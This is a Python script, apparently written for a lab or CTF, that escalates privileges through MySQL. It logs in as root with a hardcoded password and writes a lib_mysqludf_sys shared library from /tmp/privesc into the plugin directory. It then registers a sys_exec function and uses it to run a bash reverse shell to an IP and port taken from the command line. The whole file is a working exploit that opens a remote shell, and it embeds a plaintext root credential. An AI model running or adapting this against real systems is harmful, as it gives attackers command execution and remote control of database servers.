from mysql.connector import connect, Error
import random, string, time, sys

# database information
host='localhost'
user='root'
password='Nildogg36'
database='mysql'

# variables
rev_ip = sys.argv[1]
rev_port = sys.argv[2]

# library file
lib_name = 'lib_mysqludf_sys_64.so'
# library function
lib_func = 'sys_exec'
# reverse payload
payload = 'bash -c "bash -i >& /dev/tcp/{}/{} 0>&1"'.format(rev_ip, rev_port)

# connect mysqldb
def mysql_connect():
    try:
        connection = connect(
                host=host, 
                user=user, 
                password=password, 
                database=database)
        if connection.is_connected():
            db_info =  connection.get_server_info()
            print("Connected: {}".format(db_info)) # connected
            # execute query
            table_name = ''.join(random.choice(string.ascii_letters) for i in range(5))
            cursor = connection.cursor()
            cursor.execute("create table if not exists {}(library blob);".format(table_name))
            cursor.execute("insert into {} values(load_file('/tmp/privesc/{}'));".format(table_name, lib_name))
            cursor.execute("select @@plugin_dir;")
            plugin_dir = cursor.fetchone()
            try:
                cursor.execute("select * from {} into dumpfile '{}{}';".format(table_name, plugin_dir[0], lib_name))
            except:
                pass
            cursor.execute("drop function if exists {};".format(lib_func))
            cursor.execute("create function {} returns integer soname '{}';".format(lib_func, lib_name))
            cursor.execute("select {}('{}');".format(lib_func, payload))
            print(cursor.fetchone())
    except Error as e:
        print(e)
    finally:
        if connection.is_connected():
            cursor.close()
            connection.close()
            print("Connection closed")

if __name__ == '__main__':
    print(sys.argv[0])
    mysql_connect()
